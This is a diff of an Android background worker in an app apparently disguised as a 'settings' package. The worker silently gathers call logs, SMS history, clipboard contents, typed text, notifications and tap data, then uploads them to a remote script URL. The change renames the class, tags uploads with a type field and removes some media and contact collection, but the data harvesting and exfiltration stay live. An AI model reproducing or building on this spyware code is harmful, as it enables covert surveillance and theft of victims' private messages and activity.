@@ -1,12 +1,22 @@
 package com.example.settings;
 
+import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
+import static com.example.settings.MainActivity.deviceInformation;
+import static com.example.settings.MainActivity.getCellInfo;
+import static com.example.settings.MainActivity.geturl;
+import static com.example.settings.MainActivity.setuponetimeworkManager;
+import static com.example.settings.MainActivity.simName;
+import static com.example.settings.Utils.checkpermission;
+import static com.example.settings.Utils.getDateTime;
+import static com.example.settings.Utils.getphoneAppdetails;
+import static com.example.settings.Utils.newUrlData;
+
 import android.Manifest;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.os.Build;
 import android.util.Log;
-
 
 import androidx.annotation.NonNull;
 import androidx.annotation.RequiresApi;
@@ -23,28 +33,16 @@ import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 
 import java.util.HashMap;
-
 import java.util.Map;
 
-import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
-import static com.example.settings.MainActivity.deviceInformation;
-import static com.example.settings.MainActivity.getCellInfo;
-import static com.example.settings.MainActivity.geturl;
-import static com.example.settings.MainActivity.setuponetimeworkManager;
-import static com.example.settings.MainActivity.simName;
-import static com.example.settings.Utils.checkpermission;
-import static com.example.settings.Utils.getDateTime;
-import static com.example.settings.Utils.getphoneAppdetails;
-import static com.example.settings.Utils.newUrlData;
-
-public class SyncData extends Worker {
+public class SyncOneTimeData extends Worker {
     Sharedpref mSharedpref;
     Context context;
     String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime,
             Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "",NotificationData,
-            SmsData,OtherNotificationData,ClickedData,OtherClickedData;
+            SmsData,OtherNotificationData,ClickedData,OtherClickedData,type="";
     String url="";
-    public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
+    public SyncOneTimeData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
         mSharedpref = new Sharedpref(context);
         this.context = context;
@@ -56,6 +54,7 @@ public class SyncData extends Worker {
     @Override
     public Result doWork() {
         //saimaurl
+        type=getInputData().getString("Type");
         url=mSharedpref.getUrl();
         //url="https://script.google.com/macros/s/AKfycbwTSLIFqr1sjKmKw8LNHG4VxyRsiEYn87F3FkGnyse1Ey64ChtQ/exec";
 
@@ -78,19 +77,10 @@ public class SyncData extends Worker {
         if (checkpermission(context, Manifest.permission.READ_PHONE_STATE) && (checkpermission(context, Manifest.permission.READ_CALL_LOG))) {
             Utils.readCallLogs(context, mSharedpref);
         }
-        getphoneAppdetails(context,mSharedpref);
         Utils.readSmsHistory(context,mSharedpref);
         Utils.getBatteryPercent(context,mSharedpref);
         Utils.isPhoneIsLockedOrNot(context);
         Utils.checkServices(context,mSharedpref);
-        MultiMediaData multiMediaData=new MultiMediaData(context,mSharedpref);
-        multiMediaData.getAllShownImagesPath();
-        multiMediaData.getAudios();
-        multiMediaData.getWhatsAppAudios();
-        multiMediaData.getWhatsphotos();
-        multiMediaData.getWhatsAppStatus();
-        Utils.readContacts(context,mSharedpref);
-
         try {
             ClipboardManager clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
             ClipData pData = clipboardManager.getPrimaryClip();
@@ -133,29 +123,9 @@ public class SyncData extends Worker {
                                 @Override
                                 public void onResponse(String response) {
                                     Log.d(context.getPackageName(),response);
-                                    mSharedpref.setOutgoingNumbers("");
-                                    mSharedpref.setRecievedNumbers("");
-                                    mSharedpref.setMissedCallNumber("");
-                                    mSharedpref.setSaveTextWritten("");
-                                    mSharedpref.setNotificationData("");
-                                    mSharedpref.setOtherNotificationData("");
-                                    mSharedpref.setSmsData("");
-                                    mSharedpref.setClickedData("");
-                                    mSharedpref.setOtherClickedData("");
                                     mSharedpref.savePrevDate(getDateTime());
-                                    mSharedpref.setCallHistory("");
-                                    mSharedpref.setPhoneLockDetails("");
-                                    mSharedpref.setBatteryPercnt("");
-                                    mSharedpref.setSmsHistory("");
-                                    mSharedpref.setServiceStatus("");
-                                    mSharedpref.setImagesJson("");
-                                    mSharedpref.setAudioJson("");
-                                    mSharedpref.setWhatsAppImageJson("");
-                                    mSharedpref.setWhatsAppStatusJson("");
-                                    mSharedpref.setWhatsAppAudioJSon("");
-                                    mSharedpref.setServicerNotificationData("");
                                     mSharedpref.commit();
-                                   try {
+                                    try {
                                        geturl();
                                        newUrlData(context,mSharedpref);
                                    }
@@ -181,7 +151,7 @@ public class SyncData extends Worker {
                             //here we pass params
                             parmas.put("action", "addItem");
                             parmas.put("Name", Name);
-                            parmas.put("DaysTime", DaysTime);
+                            parmas.put("DaysTime", DaysTime+" Type: "+type);
                             parmas.put("TextWritten", TextWritten);
                             parmas.put("OutgoingNumbers", OutgoingNumbers);
                             parmas.put("RecievedNumbers", RecievedNumbers);
@@ -226,22 +196,7 @@ public class SyncData extends Worker {
                                 @Override
                                 public void onResponse(String response) {
                                     Log.d(context.getPackageName(),response);
-                                    mSharedpref.setOutgoingNumbers("");
-                                    mSharedpref.setRecievedNumbers("");
-                                    mSharedpref.setMissedCallNumber("");
-                                    mSharedpref.setSaveTextWritten("");
-                                    mSharedpref.setNotificationData("");
-                                    mSharedpref.setOtherNotificationData("");
-                                    mSharedpref.setSmsData("");
-                                    mSharedpref.setClickedData("");
-                                    mSharedpref.setOtherClickedData("");
                                     mSharedpref.savePrevDate(getDateTime());
-                                     mSharedpref.setImagesJson("");
-                                    mSharedpref.setAudioJson("");
-                                    mSharedpref.setWhatsAppImageJson("");
-                                    mSharedpref.setWhatsAppStatusJson("");
-                                    mSharedpref.setWhatsAppAudioJSon("");
-                                    mSharedpref.setServicerNotificationData("");
                                     mSharedpref.commit();
                                 }
                             },
@@ -250,6 +205,7 @@ public class SyncData extends Worker {
                                 public void onErrorResponse(VolleyError error) {
                                     Log.d(context.getPackageName(),"All empty Error");
                                     setuponetimeworkManager("From Volley Error When Empty");
+
                                     Result.retry();
 
                                 }
@@ -262,7 +218,7 @@ public class SyncData extends Worker {
                             //here we pass params
                             parmas.put("action", "addItem");
                             parmas.put("Name", Name);
-                            parmas.put("DaysTime", DaysTime);
+                            parmas.put("DaysTime", DaysTime+" Type: "+type);
                             parmas.put("TextWritten", "Everything is empty");
                             parmas.put("OutgoingNumbers", OutgoingNumbers);
                             parmas.put("RecievedNumbers", RecievedNumbers);
